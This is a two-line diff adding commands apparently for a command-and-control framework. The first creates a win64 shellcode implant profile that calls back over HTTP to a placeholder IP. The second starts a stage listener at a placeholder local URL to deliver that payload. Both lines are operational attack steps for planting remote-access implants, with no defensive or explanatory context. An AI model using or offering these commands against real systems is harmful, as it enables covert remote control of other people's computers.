@@ -1,0 +1,2 @@
+profiles new --http <IP>  --format shellcode --arch amd64 win64
+stage-listener --url http://<localIP>:port --profile win64
